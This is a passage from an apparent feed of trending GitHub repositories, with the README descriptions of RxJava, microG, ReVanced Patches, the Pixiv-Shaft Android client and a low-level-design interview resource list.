&lt;p&gt;Further details on building can be found on the &lt;a href="https://github.com/ReactiveX/RxJava/wiki/Getting-Started"&gt;Getting Started&lt;/a&gt; page of the wiki.&lt;/p&gt; 
&lt;h2&gt;Bugs and Feedback&lt;/h2&gt; 
&lt;p&gt;For bugs, questions and discussions please use the &lt;a href="https://github.com/ReactiveX/RxJava/issues"&gt;Github Issues&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;LICENSE&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;Copyright (c) 2016-present, RxJava Contributors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>microg/GmsCore</title>
      <link>https://github.com/microg/GmsCore</link>
      <description>&lt;p&gt;Free implementation of Play Services&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;microG Services&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/microg/GmsCore/actions/workflows/build.yml"&gt;&lt;img src="https://github.com/microg/GmsCore/actions/workflows/build.yml/badge.svg?sanitize=true" alt="Build status" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/microg/GmsCore/master/TRANSLATION.md"&gt; &lt;img src="https://hosted.weblate.org/widget/microg/svg-badge.svg?sanitize=true" alt="Translation status" /&gt; &lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;microG Services is a FLOSS (Free/Libre Open Source Software) framework to allow applications designed for Google Play Services to run on systems, where Play Services is not available.&lt;/p&gt; 
&lt;h3&gt;Please refer to the &lt;a href="https://github.com/microg/GmsCore/wiki"&gt;wiki&lt;/a&gt; for downloads and instructions&lt;/h3&gt; 
&lt;h2&gt;Translations&lt;/h2&gt; 
&lt;p&gt;If you'd like to help translate microG, take a look at &lt;a href="https://raw.githubusercontent.com/microg/GmsCore/master/TRANSLATION.md"&gt;TRANSLATION&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;Copyright 2013-2024 microG Project Team

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>ReVanced/revanced-patches</title>
      <link>https://github.com/ReVanced/revanced-patches</link>
      <description>&lt;p&gt;🧩 Patches for ReVanced&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; 
 &lt;picture&gt; 
  &lt;source width="256px" media="(prefers-color-scheme: dark)" srcset="assets/revanced-headline/revanced-headline-vertical-dark.svg" /&gt; 
  &lt;img width="256px" src="https://raw.githubusercontent.com/ReVanced/revanced-patches/main/assets/revanced-headline/revanced-headline-vertical-light.svg?sanitize=true" /&gt; 
 &lt;/picture&gt; &lt;br /&gt; &lt;a href="https://revanced.app/"&gt; 
  &lt;picture&gt; 
   &lt;source height="24px" media="(prefers-color-scheme: dark)" srcset="assets/revanced-logo/revanced-logo.svg" /&gt; 
   &lt;img height="24px" src="https://raw.githubusercontent.com/ReVanced/revanced-patches/main/assets/revanced-logo/revanced-logo.svg?sanitize=true" /&gt; 
  &lt;/picture&gt; &lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/ReVanced"&gt; 
  &lt;picture&gt; 
   &lt;source height="24px" media="(prefers-color-scheme: dark)" srcset="https://i.ibb.co/dMMmCrW/Git-Hub-Mark.png" /&gt; 
   &lt;img height="24px" src="https://i.ibb.co/9wV3HGF/Git-Hub-Mark-Light.png" /&gt; 
  &lt;/picture&gt; &lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href="http://revanced.app/discord"&gt; 
  &lt;picture&gt; 
   &lt;source height="24px" media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/13122796/178032563-d4e084b7-244e-4358-af50-26bde6dd4996.png" /&gt; 
   &lt;img height="24px" src="https://user-images.githubusercontent.com/13122796/178032563-d4e084b7-244e-4358-af50-26bde6dd4996.png" /&gt; 
  &lt;/picture&gt; &lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href="https://reddit.com/r/revancedapp"&gt; 
  &lt;picture&gt; 
   &lt;source height="24px" media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/13122796/178032351-9d9d5619-8ef7-470a-9eec-2744ece54553.png" /&gt; 
   &lt;img height="24px" src="https://user-images.githubusercontent.com/13122796/178032351-9d9d5619-8ef7-470a-9eec-2744ece54553.png" /&gt; 
  &lt;/picture&gt; &lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href="https://t.me/app_revanced"&gt; 
  &lt;picture&gt; 
   &lt;source height="24px" media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/13122796/178032213-faf25ab8-0bc3-4a94-a730-b524c96df124.png" /&gt; 
   &lt;img height="24px" src="https://user-images.githubusercontent.com/13122796/178032213-faf25ab8-0bc3-4a94-a730-b524c96df124.png" /&gt; 
  &lt;/picture&gt; &lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href="https://x.com/revancedapp"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/93124920/270180600-7c1b38bf-889b-4d68-bd5e-b9d86f91421a.png" /&gt; 
   &lt;img height="24px" src="https://user-images.githubusercontent.com/93124920/270108715-d80743fa-b330-4809-b1e6-79fbdc60d09c.png" /&gt; 
  &lt;/picture&gt; &lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href="https://www.youtube.com/@ReVanced"&gt; 
  &lt;picture&gt; 
   &lt;source height="24px" media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/13122796/178032714-c51c7492-0666-44ac-99c2-f003a695ab50.png" /&gt; 
   &lt;img height="24px" src="https://user-images.githubusercontent.com/13122796/178032714-c51c7492-0666-44ac-99c2-f003a695ab50.png" /&gt; 
  &lt;/picture&gt; &lt;/a&gt; &lt;br /&gt; &lt;br /&gt; Continuing the legacy of Vanced &lt;/p&gt; 
&lt;h1&gt;🧩 ReVanced Patches&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/ReVanced/revanced-patches/release.yml" alt="GitHub Workflow Status (with event)" /&gt; &lt;img src="https://img.shields.io/badge/License-GPL%20v3-yellow.svg?sanitize=true" alt="GPLv3 License" /&gt;&lt;/p&gt; 
&lt;p&gt;This repository contains a collection of ReVanced Patches.&lt;/p&gt; 
&lt;h2&gt;❓ About&lt;/h2&gt; 
&lt;p&gt;Patches are small modifications to Android apps that allow you to change the behavior of or add new features, block ads, customize the appearance, and much more.&lt;/p&gt; 
&lt;h2&gt;💪 Features&lt;/h2&gt; 
&lt;p&gt;Some of the features the patches provide are:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;🚫 &lt;strong&gt;Block ads&lt;/strong&gt;: Say goodbye to ads&lt;/li&gt; 
 &lt;li&gt;⭐ &lt;strong&gt;Customize your app&lt;/strong&gt;: Personalize the appearance of apps with various layouts and themes&lt;/li&gt; 
 &lt;li&gt;🪄 &lt;strong&gt;Add new features&lt;/strong&gt;: Extend the functionality of apps with lots of new features&lt;/li&gt; 
 &lt;li&gt;⚙️ &lt;strong&gt;Miscellaneous and general purpose&lt;/strong&gt;: Rename packages, enable debugging, disable screen capture restrictions, export activities, etc.&lt;/li&gt; 
 &lt;li&gt;✨ &lt;strong&gt;And much more!&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For a complete list of all available patches, visit &lt;a href="https://revanced.app/patches"&gt;revanced.app/patches&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;🚀 How to get started&lt;/h2&gt; 
&lt;p&gt;You can use &lt;a href="https://github.com/ReVanced/revanced-cli"&gt;ReVanced CLI&lt;/a&gt; or &lt;a href="https://github.com/ReVanced/revanced-manager"&gt;ReVanced Manager&lt;/a&gt; to use ReVanced Patches.&lt;/p&gt; 
&lt;h2&gt;📚 Everything else&lt;/h2&gt; 
&lt;h3&gt;📙 Contributing&lt;/h3&gt; 
&lt;p&gt;Thank you for considering contributing to ReVanced Patches. You can find the contribution guidelines &lt;a href="https://raw.githubusercontent.com/ReVanced/revanced-patches/main/CONTRIBUTING.md"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;🛠️ Building&lt;/h3&gt; 
&lt;p&gt;To build ReVanced Patches, you can follow the &lt;a href="https://github.com/ReVanced/revanced-documentation"&gt;ReVanced documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;📜 Licence&lt;/h2&gt; 
&lt;p&gt;ReVanced Patches is licensed under the GPLv3 license. Please see the &lt;a href="https://raw.githubusercontent.com/ReVanced/revanced-patches/main/LICENSE"&gt;license file&lt;/a&gt; for more information. &lt;a href="https://www.tldrlegal.com/license/gnu-general-public-license-v3-gpl-3"&gt;tl;dr&lt;/a&gt; you may copy, distribute and modify ReVanced Patches as long as you track changes/dates in source files. Any modifications to ReVanced Patches must also be made available under the GPL, along with build &amp;amp; install instructions.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>CeuiLiSA/Pixiv-Shaft</title>
      <link>https://github.com/CeuiLiSA/Pixiv-Shaft</link>
      <description>&lt;p&gt;Pixiv第三方Android客户端&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Shaft (Pixiv 第三方客户端)&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/CeuiLiSA/Pixiv-Shaft/releases/latest"&gt;&lt;img src="https://img.shields.io/github/v/release/CeuiLiSA/Pixiv-Shaft" alt="release" /&gt;&lt;/a&gt; &lt;a href="https://github.com/CeuiLiSA/Pixiv-Shaft/actions"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/CeuiLiSA/Pixiv-Shaft/gradle.yml?branch=master" alt="build status" /&gt;&lt;/a&gt; &lt;a href="https://github.com/CeuiLiSA/Pixiv-Shaft/issues?q=is%3Aopen+is%3Aissue"&gt;&lt;img src="https://img.shields.io/github/issues/CeuiLiSA/Pixiv-Shaft?color=brightgreen" alt="open issues" /&gt;&lt;/a&gt; &lt;a href="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/LICENSE"&gt;&lt;img src="https://img.shields.io/github/license/CeuiLiSA/Pixiv-Shaft" alt="license" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/README/README.ja.md"&gt;日本語(日文)&lt;/a&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;本应用为日本插画交流网站Pixiv的安卓客户端第三方重制版&lt;/li&gt; 
 &lt;li&gt;项目已开源且仅做交流和学习使用，不得用于任何商业用途&lt;/li&gt; 
 &lt;li&gt;APP内所有插画、漫画、小说作品版权均归属于其著作者或Pixiv所有&lt;/li&gt; 
 &lt;li&gt;推荐使用原版Pixiv&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;1.功能&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;用户登录，新用户注册&lt;/li&gt; 
 &lt;li&gt;大陆用户支持直连（详见&lt;a href="https://github.com/Notsfsssf/Pix-EzViewer"&gt;Pix-EzViewer&lt;/a&gt;）&lt;/li&gt; 
 &lt;li&gt;非会员用户支持按热度排序，按收藏量筛选&lt;/li&gt; 
 &lt;li&gt;GIF支持播放、保存&lt;/li&gt; 
 &lt;li&gt;本地保存浏览历史、下载历史&lt;/li&gt; 
 &lt;li&gt;支持多用户切换&lt;/li&gt; 
 &lt;li&gt;插画，漫画，小说推荐及热门TAG&lt;/li&gt; 
 &lt;li&gt;插画，漫画，小说排行榜，支持按日查看&lt;/li&gt; 
 &lt;li&gt;查看评论，添加评论，回复评论&lt;/li&gt; 
 &lt;li&gt;批量下载，支持导出下载链接&lt;/li&gt; 
 &lt;li&gt;新增小说功能&lt;/li&gt; 
 &lt;li&gt;Pixiv特辑&lt;/li&gt; 
 &lt;li&gt;R18显示（需自行到官网开启）&lt;/li&gt; 
 &lt;li&gt;过滤垃圾评论 （设定自行开启）&lt;/li&gt; 
 &lt;li&gt;支持黑暗模式&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;2.特性&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;美观大方的界面，融合多家客户端设计优点&lt;/li&gt; 
 &lt;li&gt;支持按热度排序&lt;/li&gt; 
 &lt;li&gt;流畅的动画&lt;/li&gt; 
 &lt;li&gt;简单的操作逻辑，丰富的操作反馈&lt;/li&gt; 
 &lt;li&gt;支持查看小说&lt;/li&gt; 
 &lt;li&gt;支持多国语言&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;3.快照&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;作品详情&lt;/th&gt; 
   &lt;th align="center"&gt;推荐小说&lt;/th&gt; 
   &lt;th align="center"&gt;评论列表&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;img src="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/snap/zh-cn/illust.jpg" alt="" /&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;img src="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/snap/QQ20200106-1.jpg" alt="" /&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;img src="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/snap/zh-cn/comment.jpg" alt="" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;动态页面&lt;/th&gt; 
   &lt;th align="center"&gt;作品详情&lt;/th&gt; 
   &lt;th align="center"&gt;热门标签&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;img src="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/snap/QQ20200106-3.jpg" alt="" /&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;img src="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/snap/QQ20200106-4.jpg" alt="" /&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;img src="https://github.com/CeuiLiSA/Pixiv-Shaft/raw/master/snap/zh-cn/hotTag.jpg" alt="" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;4.在 Google Play 上获取&lt;/h2&gt; 
&lt;a href="https://play.google.com/store/apps/details?id=ceui.lisa.pixiv"&gt; &lt;img alt="Get it on Google Play" src="https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png" width="330" height="128" /&gt; &lt;/a&gt; 
&lt;h2&gt;5.在 Github 上获取&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/CeuiLiSA/Pixiv-Shaft/releases/latest"&gt;Releases&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;6.常见问题 FAQ&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/CeuiLiSA/Pixiv-Shaft/master/FAQ.md"&gt;FAQ&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;开源许可&lt;/h3&gt; 
&lt;p&gt;This project is under the MIT License. See the &lt;a href="https://raw.githubusercontent.com/CeuiLiSA/Pixiv-Shaft/master/LICENSE"&gt;LICENSE&lt;/a&gt; file for the full license text.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-text"&gt;MIT License

Copyright (c) 2021 CeuiLiSA

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>ashishps1/awesome-low-level-design</title>
      <link>https://github.com/ashishps1/awesome-low-level-design</link>
      <description>&lt;p&gt;Learn Low Level Design (LLD) and prepare for interviews using free resources.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/images/lld-repo-logo.png" width="350" height="200" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://blog.algomaster.io/"&gt;Join Free Newsletter&lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;This repository contains resources to learn Low Level Design (LLD) / Object Oriented Design (OOD) and prepare for interviews.&lt;/p&gt; 
&lt;p&gt;👉 For a better and more comprehensive experience, checkout the &lt;a href="https://algomaster.io/learn/lld"&gt;LLD page at AlgoMaster.io&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;📌 Fundamental Concepts&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/basic-oop-concepts-explained-with-code"&gt;Basics OOP Concepts&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/learn/lld/dry"&gt;DRY Principle&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/learn/lld/yagni"&gt;YAGNI Principle&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/learn/lld/kiss"&gt;KISS Principle&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/backticks-tildes/the-s-o-l-i-d-principles-in-pictures-b34ce2f1e898"&gt;SOLID Principles with Pictures&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/solid-principles-explained-with-code"&gt;SOLID Principles with Code&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;⚙️ Design Patterns&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;strong&gt;Creational Patterns&lt;/strong&gt;&lt;/th&gt; 
   &lt;th&gt;&lt;strong&gt;Structural Patterns&lt;/strong&gt;&lt;/th&gt; 
   &lt;th&gt;&lt;strong&gt;Behavioral Patterns&lt;/strong&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/singleton"&gt;Singleton&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/adapter"&gt;Adapter&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/iterator"&gt;Iterator&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/factory-method"&gt;Factory Method&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/bridge"&gt;Bridge&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/observer"&gt;Observer&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/abstract-factory"&gt;Abstract Factory&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/composite"&gt;Composite&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/strategy"&gt;Strategy&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/builder"&gt;Builder&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/decorator"&gt;Decorator&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/command"&gt;Command&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/prototype"&gt;Prototype&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/facade"&gt;Facade&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/state"&gt;State&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/flyweight"&gt;Flyweight&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/template-method"&gt;Template Method&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/proxy"&gt;Proxy&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/visitor"&gt;Visitor&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/mediator"&gt;Mediator&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/memento"&gt;Memento&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://algomaster.io/learn/lld/chain-of-responsibility"&gt;Chain of Responsibility&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;🗂️ UML&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/uml-class-diagram-explained-with-examples"&gt;Class Diagram&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/119449cd-b003-46da-9e4d-0eb356d216d8"&gt;Use Case Diagram&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/4dd99bdc-5c35-4a80-bc53-1777cb57aa05"&gt;Sequence Diagram&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/what-is-activity-diagram/"&gt;Activity Diagram&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/what-is-state-machine-diagram/"&gt;State Machine Diagram&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;✅ &lt;a href="https://blog.algomaster.io/p/how-to-answer-a-lld-interview-problem"&gt;How to Answer a LLD Interview Problem&lt;/a&gt;&lt;/h2&gt; 
&lt;img src="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/images/interview-template.png" width="350" height="250" /&gt; 
&lt;h2&gt;💻 Low Level Design Interview Problems&lt;/h2&gt; 
&lt;h3&gt;Easy Problems&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/parking-lot.md"&gt;Design Parking Lot&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/stack-overflow.md"&gt;Design Stack Overflow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/vending-machine.md"&gt;Design a Vending Machine&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/logging-framework.md"&gt;Design Logging Framework&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/traffic-signal.md"&gt;Design Traffic Signal Control System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/coffee-vending-machine.md"&gt;Design Coffee Vending Machine&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/task-management-system.md"&gt;Design a Task Management System&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Medium Problems&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/atm.md"&gt;Design ATM&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/linkedin.md"&gt;Design LinkedIn&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/lru-cache.md"&gt;Design LRU Cache&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/tic-tac-toe.md"&gt;Design Tic Tac Toe Game&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/pub-sub-system.md"&gt;Design Pub Sub System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/elevator-system.md"&gt;Design an Elevator System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/car-rental-system.md"&gt;Design Car Rental System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/online-auction-system.md"&gt;Design an Online Auction System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/hotel-management-system.md"&gt;Design Hotel Management System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/digital-wallet-service.md"&gt;Design a Digital Wallet Service&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/airline-management-system.md"&gt;Design Airline Management System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/library-management-system.md"&gt;Design a Library Management System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/social-networking-service.md"&gt;Design a Social Network like Facebook&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/restaurant-management-system.md"&gt;Design Restaurant Management System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/concert-ticket-booking-system.md"&gt;Design a Concert Ticket Booking System&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Hard Problems&lt;/h3&gt; 
&lt;ul&gt; 
